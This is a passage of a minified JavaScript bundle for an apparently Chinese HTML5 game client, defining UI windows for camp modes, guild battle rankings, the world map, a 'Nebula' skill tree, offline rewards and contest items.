s.GameMap.fbType==l.FbCT.FB_TYPE_PEAKED||s.GameMap.fbType==l.FbCT.FB_PVP||s.GameMap.fbType==l.FbCT.FB_TEAM||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_ARENA||s.GameMap.fbType==l.FbCT.FB_TYPE_FOREST||s.GameMap.fbType==l.FbCT.FB_TYPE_QIYU_BOSS||s.GameMap.fbType==l.FbCT.FB_TYPE_INVADE||s.GameMap.fbType==l.FbCT.FB_TYPE_LINGJING||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_DOMINATE||s.GameMap.fbType==l.FbCT.FB_TYPE_ROGUE?(this.campBtn.visible=!1,void(this.campCom.visible=!1)):!s.GameMap.fbType||s.GameMap.fbType==l.FbCT.FB_TYPE_CITY||s.GameMap.fbType==l.FbCT.FB_PVP||s.GameMap.fbType==l.FbCT.FB_TYPE_9||s.GameMap.checkIsInShouLei()||(d.GlobalConfig.InstanceConfig[s.GameMap.fubenID]?isNaN(d.GlobalConfig.InstanceConfig[s.GameMap.fubenID].camp):!1)?void(this.campBtn.visible=this.campCom.visible=!1):(this.campBtn.visible=!0,t&&(this.campBtn.visible=!0),this.campCom.visible=!this.campBtn.visible,void(this.campBtn.visible&&(this.campBtn.icon="campMode"+p.CampCC.mode)))},e.prototype.GuideCB=function(){return this.mainPot?this.mainPot.GuideCB():null},e.prototype.showTween=function(){var t=this;if(this.firstShowQiyu)return void(this.firstShowQiyu=!1);var e=PoolMgr.create(x.TweenImg);e.source=this.cbImg.source,this.showImg.push(e),e.y=500,e.horizontalCenter=0,this.cbImg.parent.addChild(e),egret.Tween.get(e).to({y:250},1e3).call(function(){var i=t.showImg.indexOf(e);-1!=i&&(t.showImg.splice(i,1),e.parent&&e.parent.removeChild(e),PoolMgr.release(e))})},e.prototype.SetActionBtn=function(){},e.prototype.actionStartTimes=function(){d.GlobalConfig.PlayWayConfig},e.prototype.SetStartActionTime=function(t,e){this.startHour=t,this.startMinutes=e},e.prototype.judgeBossState=function(){return void 0!=C.DevildomSys.ins().lastDevildom&&C.DevildomSys.ins().lastDevildom?(this.SetActionBtn(),!0):0==C.DevildomSys.ins().killedState.length?!0:C.DevildomSys.ins().killedState[1]&&C.DevildomSys.ins().killedState[2]&&C.DevildomSys.ins().killedState[3]?!0:!1},e.prototype.updateTime=function(){},e.prototype.setActionTimes=function(t,e,i){this.minute=e,this.timeControl()},e.prototype.timeControl=function(){},__decorate([delayCall(2e3)],e.prototype,"uptateCardValue",null),e}(n.BaseView);e.MainUI=Y,window.MainUI=Y,__reflect(Y.prototype,"MainUI",[]),window.MainUI=Y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=i(1),o=i(461),s=i(462),a=i(51),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleSituationWinSkin",e._selType=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.tab,this.onTabClick),this._infoArr=new eui.ArrayCollection,this.listItem.dataProvider=this._infoArr},e.prototype.onTabClick=function(){this.selType=this.tab.selectedIndex},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.selType=0,this.tab.selectedIndex=this.selType,this.observe(a.GuildBattleCT.ins().postGuildRankInfo,this.updateView),this.observe(a.GuildBattleCT.ins().postMyRankChange,this.updateView)},Object.defineProperty(e.prototype,"selType",{get:function(){return this._selType},set:function(t){this._selType=t,0==t?(a.GuildBattleCT.ins().reqGuildRank(),this.listItem.itemRenderer=s.GuildBattleItem5,this.currentState="guild"):(a.GuildBattleCT.ins().requestOwnMyGuildRank(),this.listItem.itemRenderer=o.GuildBattleItem4,this.currentState="self")},enumerable:!1,configurable:!0}),e.prototype.updateView=function(){if(0==this.selType){var t=a.GuildBattleCT.ins().getModel().guildRankList;this._infoArr.source=t,this._infoArr.refresh()}else{var t=a.GuildBattleCT.ins().getModel().myRankList;this._infoArr.source=t,this._infoArr.refresh()}},e}(n.BaseView);e["default"]=r,window.GuildBattleSituationWin=r,__reflect(r.prototype,"GuildBattleSituationWin",[]),window.GuildBattleSituationWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MapWin=void 0;var n=i(1),o=i(1084),s=i(0),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="mapskin",e}return __extends(e,t),e.prototype.skinComplete=function(){var t=s.GlobalConfig.WorldMapConfig;for(var e in t){var i=t[e],n=new o.MapItem;n.id=i.id,this.eCityGrp.addChild(n)}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onClick),this.update()},e.prototype.update=function(){this.Scroller.viewport.validateNow();var t=this.Scroller.viewport.contentHeight;t||(t=this.contentGroup.height),this.Scroller.viewport.scrollV=t-this.Scroller.viewport.height},e.prototype.onClick=function(t){if(t.target instanceof o.MapItem)return void t.target.onClick();switch(t.target){case this.closeBtn:win.close(this)}},__decorate([delayCall(50)],e.prototype,"update",null),e}(n.BaseView);e.MapWin=a,window.MapWin=a,__reflect(a.prototype,"MapWin",[]),window.MapWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MapItem=void 0;var n=i(1),o=i(0),s=i(43),a=i(4),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="mapitemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchChildren=!1,this.touchEnabled=!0,this.alpha=0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateView()},e.prototype.updateView=function(){if(this.alpha=1,this._id&&this.skin){var t=o.GlobalConfig.WorldMapConfig[this._id];this.x=t.pos[0],this.y=t.pos[1],this.eCityImg.source=t.icon,this.eLab.text=t.name+"\n"+gettext("{0}级",t.lv[0]+"-"+t.lv[1]),this.eCloud.visible=a.ActorCC.level<t.lv[0]}},e.prototype.onClick=function(){var t=o.GlobalConfig.WorldMapConfig[this._id];a.ActorCC.level<t.lv[0]||s.CityCC.ins().sendCityGo(1,t.fbid)},Object.defineProperty(e.prototype,"id",{get:function(){return this._id},set:function(t){this._id=t,this.updateView()},enumerable:!1,configurable:!0}),__decorate([delayCall(100)],e.prototype,"updateView",null),e}(n.BaseView);e.MapItem=r,window.MapItem=r,__reflect(r.prototype,"MapItem",[]),window.MapItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MasterEquipChangeItem=void 0;var n=i(5),o=i(3),s=i(0),a=i(474),r=i(200),l=i(13),h=i(22),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.changeBtn,this.onClick),this.eItem.destruct()},e.prototype.onClick=function(t){var e=win.get("MasterEquipWin");e?e.updateView(this.cfg.id):win.open(r.MasterEquipWin,this.cfg.id),win.close(a.MasterEquipChangeWin)},e.prototype.dataChanged=function(){if(this.data){this.cfg=this.data,this.eItem.data=this.cfg.id;var t=s.GlobalConfig.ItemConfig[this.cfg.id];this.eName.text=t.name;var e=l.SubRoles.ins().getSubRoleByIndex(0),i="",o=this.cfg["attr_"+e.job];if(o&&o.length)for(var a=0,r=o;a<r.length;a++){var u=r[a];i+=h.AttributeData.getAttrStrByTypeTotem(u.id)+h.AttributeData.getAttrValStrByType(u.id,u.min)+"-"+h.AttributeData.getAttrValStrByType(u.id,u.max)+"\n"}i=i.replace(/\n$/,""),this.desc.textFlow=n.TextFlowMaker.generateTextFlow(i)}},e}(o.BaseItemRender);e.MasterEquipChangeItem=u,window.MasterEquipChangeItem=u,__reflect(u.prototype,"MasterEquipChangeItem",[]),window.MasterEquipChangeItem=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MoreGameItem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="MoreGameItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;t&&this.icon&&(this.icon.source=t.banner)},e}(n.BaseItemRender);e.MoreGameItem=o,window.MoreGameItem=o,__reflect(o.prototype,"MoreGameItem",[]),window.MoreGameItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NebulaWin=void 0;var n=i(19),o=i(70),s=i(1),a=i(485),r=i(0),l=i(36),h=i(15),u=i(4),p=i(12),d=i(2),c=i(27),f=i(132),g=i(480),m=i(481),v=i(483),y=i(484),C=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="nebulaWinSkin",e.scaleArr=[1,2,3],e.skillItemOb=[],e.scaleIdx=0,e.oldScale=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.SkillIcon.touchEnabled=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateShowSkillData,f.NebulaCT.ins().updateSkillIcon),observe(this,this.updateSkillPoints,u.ActorCC.postSkillPointChange),observe(this,this.setNebulaData,f.NebulaCT.ins().uptateNebulaData),observe(this,this.setStartPointsData,f.NebulaCT.ins().uptateNebulaStartPosData),observe(this,this.updateCostom,u.ActorCC.postSkillPointChange),observe(this,this.updateShowSkillData,f.NebulaCT.ins().uptateNebulaData),observe(this,this.updateShowSkillData,f.NebulaCT.ins().uptateNebulaStartPosData),this.addTouchEvent(this.eBtn,this.onClick),this.addTouchEvent(this.btn_help,this.onClick),this.addTouchEvent(this.detailBtn,this.onClick),this.addTouchEvent(this.changeDif,this.onClick),this.addTouchEvent(this.resetSkill,this.onClick),this.Skillnow.itemRenderer=g.NebulaAttrItem,this.Skillnow.dataProvider=this.nowListData=new eui.ArrayCollection,this.Skillnext.itemRenderer=g.NebulaAttrItem,this.Skillnext.dataProvider=this.nextListData=new eui.ArrayCollection,this.setNebulaItem(),this.scaleIdx=0,f.NebulaCT.ins().changeSKillID=1,f.NebulaCT.ins().isStarOrOrgin=!1,this.scaleXY(this.scaleIdx),this.setNebulaData(),this.updateShowSkillData(),this.updateSkillPoints(),this.eSc.viewport.scrollV=30},e.prototype.removeDisplay=function(){this.skin&&(this.removeObserve(),this.clearAll())},e.prototype.setNebulaItem=function(){var t=r.GlobalConfig.NebulaBaseConfig;if(t)for(var e=0;e<t.startingPointCount;e++)this["StartPoint"+e]&&(this["StartPoint"+e].startPoint=Number(e)+1)},e.prototype.setSelectShow=function(){var t=r.GlobalConfig.NebulaBaseConfig;if(t)if(f.NebulaCT.ins().isStarOrOrgin){for(var e=0;e<t.startingPointCount;e++)this["StartPoint"+e]&&this["StartPoint"+e].setChose(!1);for(var e in this.skillItemOb)this.skillItemOb[e].data==f.NebulaCT.ins().changeSKillID?this.skillItemOb[e].showNebulaSkillSelect(!0):this.skillItemOb[e].showNebulaSkillSelect(!1)}else{for(var e in this.skillItemOb)this.skillItemOb[e].showNebulaSkillSelect(!1);for(var e=0;e<t.startingPointCount;e++)Number(e)==f.NebulaCT.ins().changeSKillID-1?this["StartPoint"+e]&&this["StartPoint"+e].setChose(!0):this["StartPoint"+e].setChose(!1)}},e.prototype.setStartPointsData=function(){var t=r.GlobalConfig.NebulaBaseConfig;if(t)for(var e=0;e<t.startingPointCount;e++)this["StartPoint"+e]&&this["StartPoint"+e].setData()},e.prototype.setNebulaData=function(t){void 0===t&&(t=!1),this.clearAll();var e=r.GlobalConfig.NebulaConfig;if(e){for(var i in e)if(e[""+Number(i)]&&e[""+Number(i)].activate){var n=e[""+Number(i)].activate;if(n.length>1)for(var s in n){var a=Number(i),l=Math.floor(n[s]/1e3),h=f.NebulaCT.ins().returnSkillLv(a)>0?!0:!1,u=f.NebulaCT.ins().returnSkillLv(l)>0?!0:!1,p=u&&h,d=new v.NebulaLineItem;d.data=p,this.contentGroup.addChild(d),d.x=e[i].location[0],d.y=e[i].location[1],d.width=o.MathUtils.getDistance(d.x,d.y,e[l].location[0],e[l].location[1]);var c=o.MathUtils.getRadian2(d.x,d.y,e[l].location[0],e[l].location[1]),g=o.MathUtils.getAngle(c);d.rotation=g}else{var a=Number(i),l=Math.floor(n[0]/1e3),m=f.NebulaCT.ins().returnSkillLv(a)>0?!0:!1,u=f.NebulaCT.ins().returnSkillLv(l)>0?!0:!1,p=u&&m,d=new v.NebulaLineItem;d.data=p,this.contentGroup.addChild(d),d.x=e[i].location[0],d.y=e[i].location[1],d.width=o.MathUtils.getDistance(d.x,d.y,e[l].location[0],e[l].location[1]);var c=o.MathUtils.getRadian2(d.x,d.y,e[l].location[0],e[l].location[1]),g=o.MathUtils.getAngle(c);d.rotation=g}}this.skillItemOb=[];for(var C in e){var T=new y.NebulaSkillItem;T.data=e[C].id,this.contentGroup.addChild(T),this.skillItemOb.push(T)}}},e.prototype.updateSkillPoints=function(){this.skillpoint.setCoinCount(l.MoneyConst.skillPoints)},e.prototype.updateShowSkillData=function(){f.NebulaCT.ins().isStarOrOrgin?(this.SkillIcon.visible=!0,this.StartPoints.visible=!1):(this.SkillIcon.visible=!1,this.StartPoints.visible=!0),this.SkillIcon.setStarIcon(),this.StartPoints.setStarIcon(),this.UpdateNebulaData()},e.prototype.UpdateNebulaData=function(){this.setSelectShow(),f.NebulaCT.ins().isStarOrOrgin?this.starPointDateUpdate():this.startPosDateUpdate()},e.prototype.starPointDateUpdate=function(){var t,e,i,n,o,s,a,l=f.NebulaCT.ins().changeSKillID,h=f.NebulaCT.ins().returnSkillLv(l);this.eLevelMax.visible=!1,this.costLabel.visible=!0;var p=r.GlobalConfig.NebulaLevelConfig;if(0==h){this.eBtn.label=gettext("激 活"),this.eBtn.visible=!0;var d=[gettext("无")];setTimeout(() => {this.nowListData.replaceAll(window.total||d); }, 100);var c=1e3*l+1,g=p[c].attr;if(g){var m=f.NebulaCT.ins().returnAttStr(g),v=m.split("\n");p[c].desc&&v.push((null===(t=p[c])||void 0===t?void 0:t.skillV)>0?p[c].desc:p[c].desc[u.ActorCC.jobId-1]),this.nextListData.replaceAll(v)}else if(p[c].desc){var y=(null===(e=p[c])||void 0===e?void 0:e.skillV)>0?p[c].desc:p[c].desc[u.ActorCC.jobId-1],C=[y];this.nextListData.replaceAll(C)}p[1e3*l].skillname&&(this.SkillName.text=p[1e3*l].skillname[u.ActorCC.jobId-1])}else{this.eBtn.label=gettext("升 级"),this.eBtn.visible=!0;var T=1e3*l+h,g=p[T].attr;if(g){var m=f.NebulaCT.ins().returnAttStr(g),v=m.split("\n");p[T].desc&&v.push((null===(i=p[T])||void 0===i?void 0:i.skillV)>0?p[T].desc:p[T].desc[u.ActorCC.jobId-1]),this.nowListData.replaceAll(v)}else if(p[T].desc){var y=(null===(n=p[T])||void 0===n?void 0:n.skillV)>0?p[T].desc:p[T].desc[u.ActorCC.jobId-1],d=[y];this.nowListData.replaceAll(d)}if(p[T+1]){var b=p[T+1].attr;if(b){this.eBtn.visible=!0;var m=f.NebulaCT.ins().returnAttStr(b),v=m.split("\n");p[T+1].desc&&v.push((null===(o=p[T+1])||void 0===o?void 0:o.skillV)>0?p[T+1].desc:p[T+1].desc[u.ActorCC.jobId-1]),this.nextListData.replaceAll(v)}else if(p[T+1].desc){var y=(null===(s=p[T+1])||void 0===s?void 0:s.skillV)>0?p[T+1].desc:p[T+1].desc[u.ActorCC.jobId-1],d=[y];this.nextListData.replaceAll(d)}}else{this.eBtn.visible=!1,this.eLevelMax.visible=!0,this.costLabel.visible=!1;var d=[gettext("已满级")];this.nextListData.replaceAll(d)}p[T].skillname&&(this.SkillName.text=(null===(a=p[T])||void 0===a?void 0:a.skillV)>0?p[T].skillname:p[T].skillname[u.ActorCC.jobId-1])}if(l>1){var w=r.GlobalConfig.NebulaConfig,I=r.GlobalConfig.NebulaLevelConfig;if(w){var _=!0,S=w[l].activate,x=w[l].activateType,y="";switch(x){case 1:if(S&&S.length>=1)for(var D in S){var T=Math.floor(S[D]/1e3),A=Math.floor(S[D]%10);f.NebulaCT.ins().returnSkillLv(T)!=A&&(_=!1),I[S[D]].skillname&&(y+=I[S[D]].skillV>1?I[S[D]].skillname:I[S[D]].skillname[u.ActorCC.jobId-1]+" ")}else _=!0;break;case 2:if(S&&S.length>=1){_=!1;for(var D in S){var T=Math.floor(S[D]/1e3),A=Math.floor(S[D]%10);f.NebulaCT.ins().returnSkillLv(T)>=A&&(_=!0),I[S[D]].skillname&&(y+=I[S[D]].skillV>1?I[S[D]].skillname:I[S[D]].skillname[u.ActorCC.jobId-1]+" ")}}else _=!0}_?this.eInfo.visible=!1:(this.eInfo.visible=!0,this.eBtn.visible=!1,this.eLevelMax.visible=!1)}}else{var T=1e3*l+h;p[T+1]?(this.eLevelMax.visible=!1,this.eInfo.visible=!1,this.eBtn.visible=!0):(this.eInfo.visible=!1,this.eBtn.visible=!1,this.eLevelMax.visible=!0,this.costLabel.visible=!1)}if(0!=h){var _=!0,k=r.GlobalConfig.NebulaLevelConfig,B="";if(k){var T=1e3*l+h;if(k[T]){var P=k[T].activate;if(P)for(var R in P){var E=Math.floor(P[R]/1e3),A=P[R]%1e3,G=f.NebulaCT.ins().returnSkillLv(E);A>G&&(_=!1,B+=k[P[R]].skillname+" ")}}}_||(this.eInfo.visible=!0,this.eBtn.visible=!1)}this.SkillLevel.text=h+"",this.updateCostom()},e.prototype.startPosDateUpdate=function(){var t,e,i=f.NebulaCT.ins().changeSKillID,n=f.NebulaCT.ins().returnOriginPointLv(i);this.eLevelMax.visible=!1,this.costLabel.visible=!0,this.eInfo.visible=!1;var o=r.GlobalConfig.NebulaStartingPointConfig;if(0==n){this.eBtn.label=gettext("激 活"),this.eBtn.visible=!0;var s=[null===(t=o[1e3*i])||void 0===t?void 0:t.desc];this.nowListData.replaceAll(s);var a=1e3*i+1;if(o[a]){var l=null===(e=o[a])||void 0===e?void 0:e.desc,h=[l];this.nextListData.replaceAll(h)}}else{this.eBtn.label=gettext("升 级");var u=o[1e3*i+n];if(u){var l=u.desc||gettext("已满级"),s=[l];this.nowListData.replaceAll(s)}var p=o[1e3*i+n+1];if(p){this.eBtn.visible=!0;var l=p.desc||gettext("已满级"),s=[l];this.nextListData.replaceAll(s)}else{this.eBtn.visible=!1,this.eLevelMax.visible=!0,this.costLabel.visible=!1;var s=[gettext("已满级")];this.nextListData.replaceAll(s)}}i>1&&(this.eInfo.visible=!1),this.SkillLevel.text=n+"",this.updateCostom()},e.prototype.updateCostom=function(){var t=f.NebulaCT.ins().changeSKillID,e=f.NebulaCT.ins().isStarOrOrgin?f.NebulaCT.ins().returnSkillLv(t):f.NebulaCT.ins().returnOriginPointLv(t),i=f.NebulaCT.ins().isStarOrOrgin?r.GlobalConfig.NebulaLevelConfig:r.GlobalConfig.NebulaStartingPointConfig;if(this.removeCom(),f.NebulaCT.ins().isStarOrOrgin){var n=1e3*t+e;if(i[n]){var o=i[n].cost;for(var s in o){var l=new a.CostCom;this.yunyangcostGroup.addChild(l),l.setMyCost(o[s]),l.mIsShowXh=!1,l.setData(o[s],!1,!0)}}}else{var n=1e3*t+e;if(i[n]){var o=i[n].cost;for(var s in o){var l=new a.CostCom;this.yunyangcostGroup.addChild(l),l.setMyCost(o[s]),l.mIsShowXh=!1,l.setData(o[s],!1,!0)}}var h=r.GlobalConfig.NebulaBaseConfig;h&&(this.SkillName.text=h.startingPointName[f.NebulaCT.ins().changeSKillID-1])}},e.prototype.removeCom=function(){this.yunyangcostGroup&&this.yunyangcostGroup.numElements>0&&this.yunyangcostGroup.removeChildren()},e.prototype.onClick=function(t){var e,i=this;switch(t.target){case this.eBtn:if(f.NebulaCT.ins().isStarOrOrgin){var o=r.GlobalConfig.NebulaLevelConfig,s=1e3*f.NebulaCT.ins().changeSKillID+f.NebulaCT.ins().returnSkillLv(f.NebulaCT.ins().changeSKillID);if(o[s]){for(var a=!0,l=0;l<o[s].cost.length;l++)if(!n.GlobalFun.checkCost(o[s].cost[l].count,o[s].cost[l].id,"",!0,null,!1))return void(a=!1);if(!a)return;
f.NebulaCT.ins().setID(f.NebulaCT.ins().changeSKillID)}}else{var o=r.GlobalConfig.NebulaStartingPointConfig,s=1e3*f.NebulaCT.ins().changeSKillID+f.NebulaCT.ins().returnOriginPointLv(f.NebulaCT.ins().changeSKillID);if(o[s]){for(var a=!0,l=0;l<o[s].cost.length;l++)if(!n.GlobalFun.checkCost(o[s].cost[l].count,o[s].cost[l].id,"",!0,null,!1))return void(a=!1);if(!a)return;f.NebulaCT.ins().setIDOrgin(f.NebulaCT.ins().changeSKillID)}}break;case this.btn_help:win.open("CommonHelpWin",(null===(e=r.GlobalConfig.HelpInfoConfig[344])||void 0===e?void 0:e.text)||"");break;case this.detailBtn:win.open(m.NebulaDetailWin);break;case this.changeDif:this.oldScale=this.scaleArr[this.scaleIdx],this.scaleIdx++,this.scaleIdx>2&&(this.scaleIdx=0),this.scaleXY(this.scaleIdx);break;case this.resetSkill:c.WarnWin.show(gettext("重置技能将消耗|C:0xFFCE0B&T:500元宝|，将会清空技能等级。\n确认重置吗？"),function(){return u.ActorCC.yb<500?void d.TipsCT.ins().showTips(gettext("元宝不足")):(f.NebulaCT.ins().setReset(),void win.close(i))},this)}},e.prototype.setStartPoint=function(t){f.NebulaCT.ins().isStarOrOrgin=!1,f.NebulaCT.ins().changeSKillID=t,f.NebulaCT.ins().updateSkillIcon()},e.prototype.scaleXY=function(t){var e=this.scaleArr[t];if(this.contentGroup.scaleX=this.contentGroup.scaleY=e,0==t)this.eSc.viewport.scrollH=0,this.eSc.viewport.scrollV=30;else{var i=this.eSc.viewport.scrollH+(e-this.oldScale)*this.eSc.width/2;this.eSc.viewport.scrollH=i;var n=this.eSc.viewport.scrollV+(e-this.oldScale)*this.eSc.height/2;this.eSc.viewport.scrollV=n}},e.prototype.clearAll=function(){if(this.contentGroup.numElements>0)for(var t=this.contentGroup.numElements-1;t>=0;t--){var e=this.contentGroup.getElementAt(t);e instanceof y.NebulaSkillItem&&(e.clearAll(),this.contentGroup.removeChildAt(t)),e instanceof v.NebulaLineItem&&this.contentGroup.removeChildAt(t)}},e.prototype.tabRp=function(){var t;return null===(t=f.NebulaCT.ins().totemAllRed)||void 0===t?void 0:t.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=p.OpenSystem.ins().checkSysOpen(h.SystemType.NebulaDoor);return i||d.TipsCT.ins().showTips(p.OpenSystem.ins().getNoOpenTips(h.SystemType.NebulaDoor)),i},e}(s.BaseView);e.NebulaWin=C,window.NebulaWin=C,__reflect(C.prototype,"NebulaWin",[]),window.NebulaWin=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StartPoint=void 0;var n=i(1),o=i(0),s=i(132),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="nebulaItem2Skin",e.startPoint=0,e.isGoStartP=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.icon.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.setData(),this.isGoStartP&&(this.isGoStartP=!1,this.setStarIcon())},e.prototype.setData=function(){this.icon.source=o.GlobalConfig.NebulaBaseConfig.startingPointIcon[this.startPoint-1]+"_png";var t=s.NebulaCT.ins().returnOriginPointLv(this.startPoint),e="nebula_01",i=s.NebulaCT.ins().returnIsUpStartPoins(this.startPoint);e=t>0?i?"nebula_02":"nebula_03":i?"nebula_02":"nebula_01",this.iconbg.source=e},e.prototype.setChose=function(t){this.chose&&(this.chose.visible=t)},e.prototype.onClick=function(){this.setStartPoint(this.startPoint)},e.prototype.setStartPoint=function(t){s.NebulaCT.ins().isStarOrOrgin=!1,s.NebulaCT.ins().changeSKillID=t,s.NebulaCT.ins().updateSkillIcon()},e.prototype.setStarIcon=function(){if(!this.skin)return void(this.isGoStartP=!0);if(!s.NebulaCT.ins().isStarOrOrgin){var t=o.GlobalConfig.NebulaBaseConfig;t&&(this.icon.source=t.startingPointIcon[s.NebulaCT.ins().changeSKillID-1]+"_png");var e=s.NebulaCT.ins().returnOriginPointLv(s.NebulaCT.ins().changeSKillID);this.iconbg.source=e>0?"nebula_03":"nebula_02"}},e.prototype.clearAll=function(){this.icon.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e}(n.BaseView);e.StartPoint=a,window.StartPoint=a,__reflect(a.prototype,"StartPoint",[]),window.StartPoint=a},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.UpdateRemindWin=void 0;var n=i(1),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="updateRemindSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEndEvent(this,this.onTouch);var i=t[0];i&&i!=this._sn_&&(this._sn_=i)},e.prototype.onTouch=function(t){switch(t.target){case this.bgClose:case this.btn:win.close(this),t.target==this.btn&&win.open("FuliWin","GameNoticePanle")}},e}(n.BaseView);e.UpdateRemindWin=o,window.UpdateRemindWin=o,__reflect(o.prototype,"UpdateRemindWin",[]),window.UpdateRemindWin=o},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OfflineRewardWin=void 0;var n=i(1),o=i(8),s=i(23),a=i(0),r=i(36),l=i(19),h=i(31),u=i(4),p=i(2),d=i(30),c=i(25),f=i(90),g=i(124),m=i(5),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="OfflineRewardSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.grp_ad.visible=!window.platform.isshen()&&platform.getAdType()>0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.btn0,this.onClick),this.addTouchEvent(this.btn1,this.onClick),this.addTouchEvent(this.btn2,this.onClick);var i=(null===t||void 0===t?void 0:t[0])||0;this.time=i;var n=(null===t||void 0===t?void 0:t[1])||0,s=(null===t||void 0===t?void 0:t[2])||0,r=(null===t||void 0===t?void 0:t[3])||0;this.curTime.textFlow=m.TextFlowMaker.generateTextFlow1(gettext("当前总离线时间：|C:0xFFE2B7&T:{0}|",o.DateUtils.getFormatBySecond(i,o.DateUtils.TIME_FORMAT_1))),this.maxTime.textFlow=m.TextFlowMaker.generateTextFlow1(gettext("离线最长可累计：|C:0xFFE2B7&T:{0}|",o.DateUtils.getFormatBySecond(n,o.DateUtils.TIME_FORMAT_1))),this.paopaoMaxTime.textFlow=m.TextFlowMaker.generateTextFlow1(gettext("泡泡最长可累计：|C:0xFFE2B7&T:{0}|",o.DateUtils.getFormatBySecond(s,o.DateUtils.TIME_FORMAT_1))),this.need2=Math.ceil(i/43200*a.GlobalConfig.AtExpConfig.getOfflineYuanbao||0),this.costCm2.setShow(h.ITEM_ICON.yuanbao,this.need2);var l=a.GlobalConfig.ExpConfig[u.ActorCC.level];this.money.text=Math.floor(((null===l||void 0===l?void 0:l.offlineGold)||0)/43200*i)+"",this.exp.text=Math.floor(((null===l||void 0===l?void 0:l.offlineExp)||0)/43200*i)+"",this.equipNum.text=Math.floor(i/a.GlobalConfig.AtExpConfig.rewardTime*r)+"",platform.getAdType()>0&&(2==platform.getAdType()?(this.need1=Math.ceil(i/43200*a.GlobalConfig.AtExpConfig.getOfflineGold),this.costCm1.visible=!0,this.costCm1.setShow(h.ITEM_ICON.gold,this.need1)):3==platform.getAdType()?this.costCm1.visible=!1:this.costCm1.visible=!1,this.lb_getReward.visible=!this.costCm1.visible)},e.prototype.onClick=function(t){var e=this;switch(t.target){case this.btn0:s.GameLogic.ins().sendOffLine(0),win.close(this),p.TipsCT.ins().showTips(gettext("经验+{0}",Number(this.exp.text)));break;case this.btn1:if(2==platform.getAdType()||3==platform.getAdType())return void(l.GlobalFun.checkCost(this.need1,r.MoneyConst.gold)&&(s.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.OFFLine_2),win.close(this),p.TipsCT.ins().showTips(gettext("经验+{0}",2*Number(this.exp.text)))));if(c.Recharge.ins().isGotAdPrivilege||f.DeviceUtils.IsPC)return s.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.OFFLine),win.close(this),void p.TipsCT.ins().showTips(gettext("经验+{0}",2*Number(this.exp.text)));window.platform.showAd(function(){s.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.OFFLine),win.close(e),p.TipsCT.ins().showTips(gettext("经验+{0}",2*Number(e.exp.text)))},g.AdType.offLine);break;case this.btn2:var i=Math.ceil(this.time/43200*a.GlobalConfig.AtExpConfig.getOfflineYuanbao||0);l.GlobalFun.checkCost(i,r.MoneyConst.yuanbao)&&(s.GameLogic.ins().sendOffLine(1),win.close(this),p.TipsCT.ins().showTips(gettext("经验+{0}",5*Number(this.exp.text))))}},e}(n.BaseView);e.OfflineRewardWin=v,window.OfflineRewardWin=v,__reflect(v.prototype,"OfflineRewardWin",[]),window.OfflineRewardWin=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestBuffItem=void 0;var n=i(3),o=i(74),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="ContestChoseItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.touchChildren=!1,this.touchEnabled=!0},e.prototype.dataChanged=function(){this.skin&&(this.imgIcon.source=o.ContestCT.ins().getBuffMonIcon(this.data),this.select.visible=this.select2.visible=!1)},e.prototype.setSelect=function(t){this.select.visible=this.select2.visible=t},e.prototype.updateSelectState=function(){},e}(n.BaseItemRender);e.ContestBuffItem=s,window.ContestBuffItem=s,__reflect(s.prototype,"ContestBuffItem",[]),window.ContestBuffItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestPlayoffPanel=void 0;var 